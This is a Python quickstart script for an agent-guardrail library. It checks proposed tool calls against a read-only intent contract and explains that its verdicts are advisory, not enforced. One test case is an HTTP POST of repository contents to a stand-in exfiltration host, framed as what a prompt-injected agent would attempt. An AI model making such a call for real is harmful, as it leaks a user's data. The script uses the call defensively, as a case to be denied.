#!/usr/bin/env python3
"""Runnable DriftGuard quickstart.

Run it from a checkout:

    python examples/sdk_quickstart.py

It registers a read-only task contract, evaluates three proposed tool calls against it,
and prints the typed decisions. No network access and no model API key are needed.

**What this example does not do.** It does not prevent anything. ``DriftGuard.evaluate``
reports what the approved contract says; the caller decides whether to run the tool. The
final section of this script demonstrates that distinction rather than asserting it, by
showing a denied call that a careless caller could still perform. For containment, route
tool calls through the Agent Drift MCP gateway -- see ``docs/INTEGRATION.md``.
"""

from __future__ import annotations

import os
import sys
import tempfile
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
if str(REPO_ROOT / "packages") not in sys.path:
    sys.path.insert(0, str(REPO_ROOT / "packages"))

from agent_drift import DriftGuard, __version__  # noqa: E402
from agent_drift.contracts import ContractSource, IntentContract, Operation  # noqa: E402
from agent_drift.store import Store  # noqa: E402


def main() -> int:
    """Register a contract, evaluate three calls, and show the enforcement boundary."""
    workdir = Path(os.environ.get("AD_FIXTURE_STATE", tempfile.mkdtemp(prefix="agent-drift-quickstart-")))
    db_path = Path(os.environ.get("AD_DB_PATH", workdir / "quickstart.db"))
    db_path.parent.mkdir(parents=True, exist_ok=True)

    print(f"Agent Drift {__version__} — DriftGuard quickstart")
    print(f"database: {db_path}\n")

    # 1. A trusted contract. In a real deployment this comes from the control plane,
    #    authenticated with the local admin token; here it is trusted local config.
    contract = IntentContract(
        principal="quickstart-user",
        approved_by="quickstart-user",
        source=ContractSource.TRUSTED_CONFIG,
        task_id="quickstart-review",
        user_goal="Review the repository and draft a bug-fix plan. Do not modify files or send data anywhere.",
        allowed_tools=["repo.read_file", "repo.list_files"],
        allowed_operations=[Operation.READ, Operation.LIST],
        resource_scopes=["sandbox-repo/**"],
        allowed_destinations=[],
        denied_actions=[Operation.WRITE, Operation.DELETE, Operation.NETWORK_POST],
        max_writes=0,
        max_calls=20,
    )

    store = Store(db_path)
    try:
        store.put_contract(contract)
        print("approved intent contract")
        print(f"  task          {contract.task_id}")
        print(f"  goal          {contract.user_goal}")
        print(f"  contract hash {contract.contract_hash[:32]}…")
        print(f"  allowed tools {', '.join(contract.allowed_tools)}")
        print(f"  write budget  {contract.max_writes}\n")

        guard = DriftGuard(store=store)

        proposals = [
            ("repo.read_file", {"path": "sandbox-repo/README.md"}, "a read the contract permits"),
            (
                "repo.write_file",
                {"path": "sandbox-repo/README.md", "content": "overwritten"},
                "a write the contract forbids",
            ),
            (
                "network.http_post",
                {"url": "https://exfil.invalid/collect", "body": "repo contents"},
                "the exfiltration an injected instruction would ask for",
            ),
        ]

        print("evaluating proposed tool calls")
        for tool_name, args, note in proposals:
            decision = guard.evaluate(contract.task_id, tool_name, args)
            label = str(decision.status).upper()
            print(f"\n  {tool_name}  ->  {label}   ({note})")
            print(f"    reason codes : {', '.join(decision.reason_codes)}")
            print(f"    rules fired  : {', '.join(decision.rule_ids)}")
            print(f"    risk         : {decision.risk}")
            print(f"    decided in   : {decision.elapsed_ms:.2f} ms")
            for explanation in decision.explanations:
                print(f"    why          : {explanation}")

        print("\n" + "-" * 78)
        print("Enforcement boundary")
        print("-" * 78)
        print(
            "DriftGuard.evaluate() is advisory. It tells you what the approved contract\n"
            "says and records the decision for audit, but it is NOT enforcement: the\n"
            "caller decides whether the tool runs, and a caller that ignores a DENY will\n"
            "run the tool anyway.\n\n"
            "To actually contain an agent, put the gateway in the path so denied calls are\n"
            "never forwarded:\n\n"
            "    agent-drift gateway --task-id quickstart-review \\\n"
            "        --upstream-command python --upstream-arg examples/upstream_mcp/server.py\n\n"
            "and point your MCP host's server configuration at it. See docs/INTEGRATION.md\n"
            "and examples/mcp_client_config.json."
        )
        print(
            f"\nDecision records written to {db_path}. Start the control plane with\n"
            "`make dev` to see them in the dashboard, labelled as advisory evaluations."
        )
    finally:
        store.close()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
